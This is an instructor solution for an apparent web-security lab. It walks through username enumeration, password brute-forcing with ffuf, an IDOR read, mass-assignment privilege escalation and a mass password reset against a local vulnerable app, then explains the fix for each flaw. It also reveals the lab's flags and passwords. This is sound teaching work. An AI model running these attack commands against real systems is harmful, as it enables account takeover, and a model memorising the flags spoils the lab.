# DeadDrop Lab — Instructor Solution

Full walkthrough of the intended chain: **Broken Authentication (A07) &rarr;
Broken Access Control (A01)**. Do not give this to students.

Target: `http://localhost:4000` in **VULNERABLE** mode (`node server.js`).

The flags:

| Flag | Value | Earned by |
|------|-------|-----------|
| F1 | `FLAG{auth_bruteforce_foothold}` | brute-force foothold, via `GET /api/me` |
| F2 | `FLAG{authz_idor_user_api}` | IDOR read of another user via `GET /api/users/:id` |
| F3 | `FLAG{authz_mass_assignment_privesc}` | mass-assignment privesc via `PATCH /api/account` |
| F4 | `FLAG{authz_admin_account_takeover}` | reaching `GET /api/admin/users` as admin |

---

## Step 1 — Enumerate usernames (Broken Authentication)

In vulnerable mode `POST /api/login` leaks which usernames exist: an unknown user
returns **404**, a known user with a wrong password returns **401**. So fuzz the
username and match on 401.

```bash
ffuf -w usernames.txt \
  -u http://localhost:4000/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"x"}' \
  -mc 401
```

Hits (401) reveal the real accounts: `dd_admin`, `alice`, `bob`, `charlie`,
`dave`, `support`, `erin`, `frank`. Everything else returns 404.

## Step 2 — Brute-force a weak account (Broken Authentication) &rarr; **F1**

Pick `bob` (intended foothold) and fuzz the password, matching on 200. There is no
rate limit in vulnerable mode.

```bash
ffuf -w passwords.txt \
  -u http://localhost:4000/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"FUZZ"}' \
  -mc 200
```

Password: `qwerty`. Grab the token:

```bash
curl -s -X POST http://localhost:4000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"qwerty"}'
# {"token":"<TOKEN>"}
```

Prove the foothold:

```bash
curl -s http://localhost:4000/api/me -H "Authorization: Bearer <TOKEN>"
# {... "flag":"FLAG{auth_bruteforce_foothold}"}   <-- F1
```

> `dd_admin` (id 1) uses `Zx9#Qv!m2_Lp7`, which is not on any wordlist. Do not try
> to crack it — the rest of the chain makes it irrelevant.

## Step 3 — IDOR: read other users (Broken Access Control) &rarr; **F2**

`GET /api/users/:id` returns ANY user's record regardless of who you are. Reading an
id that is not your own returns `flag: F2`. Walk the ids with your bearer token.

```bash
curl -s http://localhost:4000/api/users/1 -H "Authorization: Bearer <TOKEN>"
# {"id":1,"username":"dd_admin","role":"admin", ... "flag":"FLAG{authz_idor_user_api}"}  <-- F2

for i in 1 2 3 4 5 6 7 8; do
  curl -s http://localhost:4000/api/users/$i -H "Authorization: Bearer <TOKEN>"; echo
done
```

You now see the whole roster (no passwords), including that `dd_admin` is the admin.
You do **not** need its password — you will make yourself an admin next.

## Step 4 — Mass assignment: escalate yourself (Broken Access Control) &rarr; **F3**

`PATCH /api/account` blindly copies request-body fields onto your own user object,
including `role`. Set yourself to admin:

```bash
curl -s -X PATCH http://localhost:4000/api/account \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
# {"id":3,"username":"bob","role":"admin", ... "flag":"FLAG{authz_mass_assignment_privesc}"}  <-- F3
```

Your existing token is now an admin session.

## Step 5 — Admin takeover + blast radius &rarr; **F4**

Reach admin-only functionality:

```bash
curl -s http://localhost:4000/api/admin/users -H "Authorization: Bearer <TOKEN>"
# {"users":[...all 8...],"flag":"FLAG{authz_admin_account_takeover}"}  <-- F4
```

Blast radius — mass password reset over every id with the admin reset endpoint:

```bash
ffuf -w <(seq 1 8) \
  -u http://localhost:4000/api/admin/users/FUZZ/reset \
  -X POST -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"password":"pwned"}' \
  -mc 200
```

Every account's password is now `pwned`, including `dd_admin` (id 1). The strong,
uncrackable admin password was never the obstacle — broken access control let a
low-privilege user seize the whole system.

---

## The Fix (SECURE mode) — `SECURE=1 node server.js`

Each vulnerability maps to a specific remediation that blocks the step above.

### 1. Broken Authentication — user enumeration + no rate limit

- **Vuln:** login distinguishes 404 (unknown user) from 401 (wrong password), and
  never throttles. Enumeration + unlimited guessing.
- **Fix:** return a single generic **401 `invalid credentials`** for *both* unknown
  user and wrong password — the attacker can no longer tell valid usernames apart.
  Add a per-username lockout: after 5 failures, return **429 `locked`** for 60s, and
  return 429 *even for a correct password* while locked, so online brute force stalls.
- **Why it works:** removing the oracle kills Step 1, and the lockout kills the
  high-rate guessing in Step 2.

### 2. IDOR — `GET /api/users/:id`

- **Vuln:** any authenticated user can read any id.
- **Fix:** enforce an object-level check — allow the lookup only if `:id` is the
  caller's own id **or** the caller is an admin; otherwise **403 `forbidden`**.
- **Why it works:** Step 3 now returns 403 for every id but your own, so the roster
  no longer leaks.

### 3. Mass assignment — `PATCH /api/account`

- **Vuln:** the handler copies arbitrary body fields (including `role`) onto the user.
- **Fix:** **allow-list** only `displayName` and `email`. Ignore `role`, `id`, and
  `password` entirely. The caller's identity always comes from the token, never the body.
- **Why it works:** Step 4's `{"role":"admin"}` is silently ignored; the role never
  changes, so no escalation.

### 4. Admin takeover — `GET /api/admin/users` and `/reset`

- These enforce `role === 'admin'` in **both** modes. They are not themselves broken;
  they are only reachable because Step 4 escalated the attacker. Once mass assignment
  is fixed, a normal user stays a normal user and receives **403** here. The admin
  endpoints are legitimate power that must sit behind a role check and reachable-only
  by genuine admins.

### Status-code reference

| Code | Vulnerable mode | Secure mode |
|------|-----------------|-------------|
| 200 | success / exploit worked | success (legitimate only) |
| 400 | bad input | bad input |
| 401 | unknown-user vs wrong-password distinguishable | generic for both (no enumeration) |
| 403 | wrong role only | wrong role **and** blocked IDOR / privesc attempts |
| 404 | user not found (leaks non-existence on login) | user not found (login no longer leaks it) |
| 429 | never | lockout after repeated failures |
